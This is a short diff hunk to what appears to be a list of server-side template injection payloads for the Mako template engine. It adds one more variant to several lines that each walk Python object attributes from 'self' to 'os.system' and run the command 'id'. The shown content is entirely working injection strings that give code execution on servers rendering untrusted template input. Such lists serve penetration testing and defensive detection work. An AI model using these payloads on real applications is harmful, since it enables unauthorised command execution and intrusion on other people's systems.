@@ -76,3 +76,4 @@ ${self.context._with_template.module.runtime.util.os.system("id")}
 ${self.module.cache.util.compat.inspect.linecache.os.system("id")}
 ${self.template.module.runtime.util.compat.inspect.os.system("id")}
 ${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
